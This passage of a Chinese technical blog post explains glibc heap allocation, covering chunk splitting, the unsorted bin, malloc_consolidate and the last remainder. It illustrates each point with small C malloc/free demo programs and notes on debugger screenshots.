class=\"line\">    <span class=\"keyword\">void</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p3);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>看一下chunk的信息</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201134939.png\" alt=\"image-20201215201134939\"></p>\n<p>free p1，将p1放入了unsorted bin中</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201206634.png\" alt=\"image-20201215201206634\"></p>\n<p>分配p3 可以看到是直接覆盖p1的地方</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201235306.png\" alt=\"image-20201215201235306\"></p>\n</blockquote>\n<h5 id=\"切割一块chunk（unsorted-bin）\"><a href=\"#切割一块chunk（unsorted-bin）\" class=\"headerlink\" title=\"切割一块chunk（unsorted bin）\"></a><strong>切割一块chunk（unsorted bin）</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>); <span class=\"comment\">//为了防止p被topchunk合并</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里我们直接看p2分配之后</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215201554898.png\" alt=\"image-20201215201554898\"></p>\n<p>这里为什么会出现这个情况呢？</p>\n<p>其实它是在unsorted bin中切割了一块符合自己大小的chunk 拿出来分配</p>\n</blockquote>\n<p><strong>分割一块较大的free chunk（unsorted bin）</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>); <span class=\"comment\">//为了防止p被topchunk合并</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x300</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);c</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>根据上面的理论这回就应该去top chunk中切割了 事实也确实如此</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215202105325.png\" alt=\"image-20201215202105325\"></p>\n</blockquote>\n<p>经过以上演示我们不难得出一下结论</p>\n<ol>\n<li>只要切割大小正好 它就会从已free的chunk中寻找</li>\n<li>关于fastbin 和 unsorted bin中free chunk分配是不一样的</li>\n<li>如果较大 会从top chunk中寻找</li>\n</ol>\n<h4 id=\"3-free的机制\"><a href=\"#3-free的机制\" class=\"headerlink\" title=\"3.free的机制\"></a>3.free的机制</h4><ul>\n<li>①如果free的chunk的大小在0x20~0x80之间（fastbin的范围），那么该chunk直接放到fast bin上</li>\n<li>②如果free的chunk的大小大于0x80（大于fast bin的范围），此时不会直接放到small bin或者large bin上面。而是放到unsorted bin上面</li>\n</ul>\n<h3 id=\"0x13-malloc-consolidate\"><a href=\"#0x13-malloc-consolidate\" class=\"headerlink\" title=\"0x13 malloc_consolidate\"></a>0x13 malloc_consolidate</h3><p><strong>这个主要是解决unsorted bin中的碎片化，整合成新的bin，也就是放入small bin或large bin中</strong></p>\n<h4 id=\"1-consolidate的定义\"><a href=\"#1-consolidate的定义\" class=\"headerlink\" title=\"1.consolidate的定义\"></a>1.consolidate的定义</h4><ul>\n<li>我们知道大于0x80的chunk被释放之后就放到了unsortedbin上面去，但是unsortedbin是一个未分类的bin，上面的chunk也处于未分类的状态。但是这些chunk需要在特定的条件下被整理然后放入到smallbins或者largebins中</li>\n<li>这个整理的过程被称为unsortedbin的“consolidate”，但是“consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关</li>\n</ul>\n<h4 id=\"2-触发场景\"><a href=\"#2-触发场景\" class=\"headerlink\" title=\"2.触发场景\"></a>2.触发场景</h4><ul>\n<li>当我们malloc一个chunk，这个chunk的大小大于smallbin的范围，在unsortedbin中寻找可用的freechunk使用时，会触发malloc_conlolidate</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190810155737453.png\" alt=\"img\"></p>\n<ul>\n<li>malloc时如果bin链中没有可以使用的freechunk，并且去切割topchunk，发现topchunk也不够用，此时回去再去调用malloc_consolidate进行一次整理</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190810155901661.png\" alt=\"img\"></p>\n<ul>\n<li>发现unsortedbin中有大的freechunk可以切割给malloc使用时，切割unsortedbin，产生last remainder的时候会consolidate</li>\n</ul>\n<p><strong>着重强调，1和2都会去寻找fastbin中的free chunk</strong></p>\n<h4 id=\"3-具体分析\"><a href=\"#3-具体分析\" class=\"headerlink\" title=\"3.具体分析\"></a>3.具体分析</h4><p><strong>当我们malloc一个大小大于smallbin的chunk时：</strong></p>\n<ul>\n<li><p><strong>第一步：</strong>将fastbins中的chunk都整理到unsortedbin中，整理的过程中如果有物理相邻且空闲的fastchunk就合并，如果fastchunk与topchunk相邻，那么fastchunk就与topchunk合并（这个过程发生在_int_malloc函数调用的malloc_consolidate函数中）</p>\n</li>\n<li><p><strong>第二步：</strong>malloc去检查unsortedbin中是否有与自己malloc大小相对应的chunk可以使用，如果有与自己malloc大小相对应的chunk可以使用就直接使用；如果没有那么就去判断unsortedbin中是否有可以用来切割的大chunk可以使用，如果可以切割，就切割大的chunk使用，然后产生last remainder（这个过程发生在_int_malloc函数的for循环中）</p>\n</li>\n<li><strong>第三步：</strong>如果没有可以切割的大chunk可以使用，此时就将unsortedbin上的chunk放入到对应的bins链上</li>\n<li><strong>第四步：</strong>malloc从第一次分配的大堆块上面找空间来使用</li>\n</ul>\n<h4 id=\"4-演示一\"><a href=\"#4-演示一\" class=\"headerlink\" title=\"4.演示一\"></a>4.演示一</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//只为了程序打断点使用，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x500</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>打断点 看堆信息</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141039796.png\" alt=\"image-20201216141039796\"></p>\n<p>释放p1 看到进入fastbin中</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141113312.png\" alt=\"image-20201216141113312\"></p>\n<p>分配p2 可以看到我们p1好像是被覆盖了  我们具体来说一下这个过程</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141143610.png\" alt=\"image-20201216141143610\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141159043.png\" alt=\"image-20201216141159043\"></p>\n<p>当分配比small bin大的chunk时，我们就会触发consolidate，</p>\n<ol>\n<li>我们知道fastchunk是不会合并的 所以它们这时就会进入unsortedbin中</li>\n<li>然后malloc去切割unsortedbin中的这个freechunk，发现不能够切割，于是就放入smallbin中，放入smallbin中之后便成为smallchunk了，就可以与topchunk合并了</li>\n<li>合并之后malloc从topchunk中申请一个堆块</li>\n</ol>\n</blockquote>\n<h4 id=\"5-演示二\"><a href=\"#5-演示二\" class=\"headerlink\" title=\"5.演示二\"></a>5.演示二</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//只为了程序打断点使用，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> \t<span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x500</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>释放p1和p</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216142837517.png\" alt=\"image-20201216142837517\"></p>\n<p>下面我们猜想会发送什么?</p>\n<p>由于分配chunk较大 所以我们会触发consolidate 这时两个fastchunk就会进入unsortedbin中 根据上面规则 它下一步就会进入small bins</p>\n<p>又因为和top chunk相邻 所以top chunk会合并 </p>\n<p>直观感觉就是我们覆盖了之前的chunk</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216143203315.png\" alt=\"image-20201216143203315\"></p>\n</blockquote>\n<h3 id=\"0x14-last-remainder\"><a href=\"#0x14-last-remainder\" class=\"headerlink\" title=\"0x14 last remainder\"></a>0x14 last remainder</h3><h4 id=\"1-定义\"><a href=\"#1-定义\" class=\"headerlink\" title=\"1.定义\"></a>1.定义</h4><ul>\n<li>如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong></li>\n<li>当产生last remainder之后，表示arena的<strong>malloc_state结构体中的last_remainder成员</strong>指针就会<strong>被初始化</strong>，并且指向这个last remainder</li>\n</ul>\n<h4 id=\"2-产生场景\"><a href=\"#2-产生场景\" class=\"headerlink\" title=\"2.产生场景\"></a>2.产生场景</h4><ul>\n<li>malloc的时候，不论malloc的大小，首先会去检查每个bins链（出去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有大的freechunk可以切割，如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中</li>\n</ul>\n<blockquote>\n<p><strong>切割unsortedbin中的大chunk时：</strong></p>\n<p>当unsortedbin有对应的freechunk可以给malloc切割使用时，unsortedbin会发生以下步骤：</p>\n<ul>\n<li>①先将这些freechunk放置到对应大小的bins链上（放入smallbin或largebin）</li>\n<li>②放置到对应的bins链上之后，切割此freechunk</li>\n<li>③切割之后会产生last remainder，再将last remainder放到unsortedbin上</li>\n</ul>\n<p><strong>例如：</strong></p>\n<ul>\n<li>此时，unsortedbin有两个0x800的freechunk</li>\n<li>此时申请一个0x600的chunk</li>\n<li>那么unsortedbin会先consolidate，把两个0x800的freechunk先移动到largebin中</li>\n<li>然后再切割largebin的freechunk，将切割后余留下的0x200放入unsortedbin</li>\n</ul>\n<p><strong>切割smallbins、largebins中的大chunk时：</strong></p>\n<ul>\n<li>①切割smallbins或者largebins中的大freechunk，产生last remainder</li>\n<li>②将last remainder放入到unsortedbin中</li>\n</ul>\n</blockquote>\n<h4 id=\"3-last-remainder的consolidate\"><a href=\"#3-last-remainder的consolidate\" class=\"headerlink\" title=\"3.last remainder的consolidate\"></a>3.last remainder的consolidate</h4><p>当我们切割一个bins链中的大chunk时产生last reminader时，会发生consolidate，<strong>但是此种consolidate不会去整理fastbins中的freechunk（重点）</strong></p>\n<h4 id=\"4-演示一-1\"><a href=\"#4-演示一-1\" class=\"headerlink\" title=\"4.演示一\"></a>4.演示一</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span> = <span class=\"number\">0x120</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *junk = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);  <span class=\"comment\">//放置释放p和q之后，p和q发生合并</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> *q = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *r = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);   <span class=\"comment\">//放置释放q之后，q和topchunk发生合并</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"p:0x%x\\n\"</span>,p);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"q:0x%x\\n\"</span>,q);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"r:0x%x\\n\"</span>,r);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(p,<span class=\"string\">\"aaaaaaaabbbbbbbb\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(q,<span class=\"string\">\"ccccccccdddddddd\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(r,<span class=\"string\">\"eeeeeeeeffffffff\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(q);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>断点</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151435089.png\" alt=\"image-20201216151435089\"></p>\n<p>释放p和q</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151556927.png\" alt=\"image-20201216151556927\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151633713.png\" alt=\"image-20201216151633713\"></p>\n<p>分配0x90  </p>\n<ul>\n<li>首先两个unsortedbin chunk中可以分割到0x90那么就会consolidate 将其全部放入smallbins中</li>\n<li>之后分割其中一部分 并将剩余的放入lastremainder</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151705158.png\" alt=\"image-20201216151705158\"></p>\n</blockquote>\n<h4 id=\"5-演示二-1\"><a href=\"#5-演示二-1\" class=\"headerlink\" title=\"5.演示二\"></a>5.演示二</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x30</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> size2=<span class=\"number\">0x200</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(size2);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//防止p2和p3都被释放之后，p2和p3发生合并</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(size2);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//防止p3被释放之后与topchunk合并</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为打断点使用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p3);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>直接看释放p1 p2 p3</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216155717972.png\" alt=\"image-20201216155717972\"></p>\n<p>这里继续想一下下一步会发生什么？</p>\n<ul>\n<li>分配大小0x100可以分配 那么就直接触发consolidate说明smallbin中就会有free chunk</li>\n<li>lastremainder会放入unsortedbin中，此外fastfreechunk不会合并</li>\n<li>那么我们就得到了</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160152597.png\" alt=\"image-20201216160152597\"></p>\n</blockquote>\n<h4 id=\"6-演示三\"><a href=\"#6-演示三\" class=\"headerlink\" title=\"6.演示三\"></a>6.演示三</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x300</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);  <span class=\"comment\">//防止p1被释放之后与topchunk合并</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//为了程序打断点使用，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x700</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>直接看p1释放后</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160410739.png\" alt=\"image-20201216160410739\"></p>\n<p>之后会分配0x700说明要分配较大的chunk 此时会被整理到smallbins中</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160827250.png\" alt=\"image-20201216160827250\"></p>\n<p>继续分配0x200 lastremainder会进入unsortedbin中</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160910272.png\" alt=\"image-20201216160910272\"></p>\n</blockquote>\n<h4 id=\"7-演示四\"><a href=\"#7-演示四\" class=\"headerlink\" title=\"7.演示四\"></a>7.演示四</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span 